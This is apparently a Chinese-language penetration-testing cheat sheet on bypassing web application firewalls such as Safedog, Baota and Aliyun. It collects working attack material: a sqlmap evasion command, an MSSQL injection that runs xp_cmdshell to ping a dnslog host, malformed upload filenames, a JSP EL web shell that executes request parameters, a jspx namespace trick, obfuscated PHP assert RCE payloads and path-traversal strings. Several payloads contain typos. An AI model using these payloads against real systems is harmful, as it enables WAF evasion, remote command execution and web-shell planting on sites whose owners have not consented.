## 漏洞发现触发WAF点-针对xray, awvs等

1.扫描速度- (代理池，延迟，白名单等)
2.工具指纹- (特征修改，伪造模拟真实用户等)
3.漏洞Payload- (数据变异,数据加密，白名单等)

代理池Proxy_ _pool项 目搭建及使用解释
充钱代理池直接干safedog+BT+Aliyun探针
Safedog-awvs漏扫注入测试绕过延时，白名单
Aliyun_ _os(云盾)-awvs漏扫注入测试绕过-延时白名单
BT(baota)-awvs+xray漏扫Payload绕过延时被动
充钱代理池直接干Safedog+BT+AliyunOS漏洞发现

## SQI注入

如需sqlmap注入修改us头及加入代理防cc拦截自写tamper模块
安全狗:参考之前payload
Aliyun:基本修改指纹即可
宝塔:匹配关键字外加/+等

```
sqlmap --proxy="http://127.0.0.1:8080" --tamper="waf.py" --random-agent
```

360主机卫士是一个很老的WAF，也早已停止更新，所以绕起来不是很难，这里直接使用师傅发的Payload通过dnslog方式来测试是否可以正常执行命令

```
'+and+(select+1)=(Select+0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)+exec+master..xp_cmdshell+'ping+******.dnslog.cn';*--*
```



## 文件上传

1.php截断参考前面上传wa f绕过payload

```
#Payload:
不量垃圾数据缓冲溢出(Content-Disposition, filename等)
filename=x-php
filenane="x. php
filename='x.php
filanane="a.jpg; .php";
filename="a.php80D.jpg"
filename="Consent- -Diaposition: form-data;
name="upload_ ile" ;x.php" 
filename="x. aPg"; filename="x.jpg"; ... . .filename="x.php";
filename="xxx/x-jpg" 
filename=
"
x
.
p
h
p
"
```

tomcat系列

1、后缀名

在后缀名绕过那里可以绕过是因为`tomcat`认为`.jsp/`在文件名中是非法的，`Tomcat`会自动去除非法的`/`号，并不是因为`windows`的特性。但`.jsp\`的反斜杠在本地测试时也可以正常解析去除，在目标机上却无法解析，个人感觉应该很大程度取决于所用的java库及其版本

```
filename=jsp/
```

2、内容绕过

所以我们得绕过`JSP标记`检测，这里两种绕过方法。

- jspEL表达式绕过

- jspx命名空间绕过

- **第一种是利用${}标记：**

  payload：

  ```
  ${Runtime.getRuntime().exec(request.getParameter("x"))}
  ```

**第二种是利用命名空间的特性：**

参照yzddmr6师傅的图：

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcwBT53V11MO0kgwBDTnYPWwGQOG8dfR7UwficDMoU8mGAV9cdo7VZfYYu25u8rnHtrzSpdGNP9czQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



使用自定义的命名空间，替换掉`jsp`的关键字，将原本的`<jsp:scriptlet>`替换成`<自定义字符:scriptlet>`，这样waf的正则匹配不到`<jsp:scriptlet>`自然就会放行

```xml
<hi xmlns:hi="http://java.sun.com/JSP/Page">
	<hi:scriptlet>
		out.println(30*30);
	</hi:scriptlet>
</hi>
```

## Xss跨站

利用xsstrike绕过加上--timeout或--proxy绕过cc

## 其他集合

RCE:
加密加码绕过?算法可逆?关键字绕过?提交方法?各种测试!

```
txt=$y=str_replace('x','','pxhpxinxfo()') ;assert($y);&submit=8E688F8908E48BA8A4   //拼接，替换

txt=$x='asse';$xx=$REQUEST['x']$xx=$x.$xx;$y=str_replace('x',"'pxhpxinxfo0);$xx($y);&submit=96E6%8F%90%E4%BA%A4


txt=$hex='706870696e666f28293b jassert(pack("H*". $hex));&usubmit=9E6%8F%90%6E4%BA9%A4	//16进制
```

文件包含:没什么好说的就这几种

```
..\   ..../   ..\.\ 等
```

## 宝塔waf绕过

https://mp.weixin.qq.com/s/-tenIIgbhXa-T331V5Je1g
